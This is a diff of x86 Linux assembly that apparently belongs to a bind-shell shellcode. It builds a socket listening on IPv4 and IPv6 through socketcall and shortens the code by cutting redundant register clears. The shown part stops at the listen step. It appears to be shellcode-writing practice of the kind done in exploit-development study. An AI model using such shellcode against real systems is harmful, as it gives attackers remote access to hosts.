@@ -5,15 +5,15 @@ section .text
 _start:
   ; socket
   ;; cleanup
-  xor eax, eax
   xor ebx, ebx
   ;; arguments
-  push eax        ; #define IP_PROTO 0
+  push ebx        ; #define IP_PROTO 0
   push 0x1        ; #define SOCK_STREAM 1
   push 0xa        ; #define PF_INET6 10
   ;; function
   mov ecx, esp    ; pointer to args on the stack into ecx
-  mov al, 0x66    ; socketcall 0x66 == 102
+  push 0x66
+  pop eax         ; socketcall 0x66 == 102
   inc ebx         ; #define SYS_SOCKET 1
   ;; call
   int 0x80
@@ -23,7 +23,6 @@ _start:
   ; setsocketopt
   ;; cleanup
   xor eax, eax
-  xor ebx, ebx
   ;; arguments
   push eax        ; NO = 0x0
   mov edx, esp    ; get a pointer to the null value
@@ -34,14 +33,12 @@ _start:
   ;; function
   mov ecx, esp    ; pointer to args on the stack into ecx
   mov al, 0x66    ; socketcall 0x66 == 102
-  mov bl, 0xe     ; #define SYS_SETSOCKOPT
+  mov bl, 0xe     ; #define SYS_SETSOCKOPT 14
   ;; call
   int 0x80
 
   ; bind ipv4
   ;; cleanup
-  xor eax, eax
-  xor ebx, ebx
   xor edx, edx
   ;; v4lhost struct
   push edx          ; #define INADDR_ANY 0
@@ -49,7 +46,7 @@ _start:
   push 0x2          ; #define AF_INET 2
   ;; arguments
   mov ecx, esp      ; pointer to v4lhost struct arguments
-  push byte 0x10    ; sizeof v4lhost
+  push 0x10         ; sizeof v4lhost
   push ecx          ; pointer v4lhost
   push esi          ; push sockfd onto stack
   ;; function
@@ -62,8 +59,6 @@ _start:
   ; bind ipv6
   ;; cleanup
   xor eax, eax
-  xor ebx, ebx
-  xor edx, edx
   ;; v6lhost struct
   push dword eax    ; v6_host.sin6_addr
   push dword eax
@@ -85,9 +80,6 @@ _start:
   int 0x80
 
   ; listen
-  ;; cleanup
-  xor eax, eax
-  xor ebx, ebx
   ;; arguments
   push byte 0x2     ; queuelimit = 2
   push esi          ; sockfd
